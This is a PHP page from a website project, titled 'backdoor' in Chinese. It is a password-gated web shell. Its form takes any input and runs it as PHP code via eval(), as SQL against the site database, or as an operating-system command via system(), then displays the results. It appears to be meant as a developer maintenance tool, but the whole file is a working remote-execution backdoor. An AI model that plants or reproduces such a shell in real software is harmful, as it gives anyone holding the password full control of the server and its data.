<?php
require_once ('config.php');
require_once('func.inc.php');
handlePwd($BACKDOOR_PWD);
?><!doctype html>
<html>
<head>
<title>后门_<?php echo $WEBSITE_NAME; ?></title>
<meta charset="utf-8" />
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="style/color.css" />
<link rel="stylesheet" type="text/css" href="style/main.css" />
</head>

<body>
	<div class="select">
		<h1>执行命令</h1>
		<script type="text/javascript">
		function setFocus(){
			document.getElementById('input_cmd').focus();
		}
		</script>
		<form class="withBorder" action="" method="post">
			<input type="hidden" name="pwd" value="<?php echo filter(@$_POST ['pwd']);?>">
			<label for="type_php">
			<input type="radio" id="type_php" name="type" value="PHP" onclick="setFocus()"
				<?php if(@$_POST['type'] === 'PHP'){echo 'checked="checked"';}?> />
				PHP(需要分号结尾)
			</label>
			<label for="type_sql">
			<input type="radio" id="type_sql" name="type" value="SQL" onclick="setFocus()" 
			<?php if(@$_POST['type'] === 'SQL'){echo 'checked="checked"';}?> />
				SQL
			</label>
			<label for="type_system">
			<input type="radio"	id="type_system" name="type" value="system" onclick="setFocus()"
				<?php if(@$_POST['type'] === 'system'){echo 'checked="checked"';}?> />
				系统命令
			</label>
			<br /> 
			<input type="text" class="cmd" id="input_cmd" autofocus="autofocus"
				name="cmd" value="<?php if (isset ( $_POST ['cmd'] )) {echo filter ( $_POST ['cmd'] );}?>"/>
			<input type="submit" value="确定" />
		</form>
	</div>
	<hr />
	<div class="console">
		<p>
<?php
function exeSql($sql) {
	global $DB;
	echo 'SQL命令:' . filter ( $sql ) . '<br/>';
	$resultStmt = $DB->query ( $sql );
	echo '命令执行完毕。<br/>';
	if ($resultStmt !== false) {
		// SELECT，SHOW，DESCRIBE, EXPLAIN 等 结果显示（测试可以）
		$result = $resultStmt -> fetchAll(PDO::FETCH_ASSOC);
		showTable ( $result);
		echo '<span class="success">执行成功！影响的行数：' . count($result) . '</span><br/>';
	} else {
		echo '<span class="fail">执行SQL失败，错误信息：';
		var_dump($DB->errorInfo());
		echo '</span><br/>';
	}
}

// TODO:语法错误命令测试和处理
function exePhp($php) {
	echo 'PHP命令：' . filter ( $php ) . '<br/><pre>';
	$ret = eval ( $php );
	echo '</pre>';
	// eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。
	// 如果在执行的代码中有一个解析错误，eval() 返回 FALSE，之后的代码将正常执行。
	if ($ret !== NULL) {
		if ($ret === false) {
			echo '<span class="fail">输入的代码解析错误</span><br />';
		} else {
			echo '<br />返回值为：';
			var_dump ( $ret );
			echo '<br />';
		}
	}
}

function exeSys($cmd) {
	if (strstr ( ini_get ( 'disable_functions' ), 'system' )) {
		echo 'system() 已被禁用。无法执行命令。<br />';
	}
	echo '系统命令：' . filter ( $cmd ) . '<br/>';
	
	ob_start (); // 将输出的内容被存储在内部缓冲区中，以从GBK转换为UTF-8
	$ret = system ( $cmd );
	$out = ob_get_contents ();
	ob_end_clean ();
	
	if (strtoupper ( substr ( PHP_OS, 0, 3 ) ) === 'WIN') {
		echo '检测到服务器为Windows系统，正在将输出从GBK转码为UTF-8<br />';
		$out = iconv ( 'GBK', 'UTF-8', $out ); // 从GBK转码为UTF-8
	}
	echo '<pre>' . filter ( $out ) . '</pre>';
	// system():成功则返回命令输出的最后一行， 失败则返回 FALSE
	if ($ret === false) {
		echo '<span class="fail">命令执行失败。</span><br />';
	}
}

if (! isset ( $_POST ['cmd'] ) || $_POST ['cmd'] == '') {
	echo '等待命令。<br />';
} elseif ($_POST ['type'] == '') {
	echo '<span class="fail">请选择命令类型！</span><br />';
} elseif ($_POST ['type'] == 'SQL') {
	require_once('./db.php');
	exeSql ( $_POST ['cmd'] );
} elseif ($_POST ['type'] == 'PHP') {
	exePhp ( $_POST ['cmd'] );
} elseif ($_POST ['type'] == 'system') {
	exeSys ( $_POST ['cmd'] );
} else {
	echo '你在干嘛？What ARE YOU doing?<br />';
}
?>
</p>
	<p><a href="testDb.php" target="_blank">测试数据库连接</a>&nbsp;
	<a href="index.php">返回首页</a></p>
	<p><?php echo $DEV_INFO;?></p>
	</div>
</body>
</html>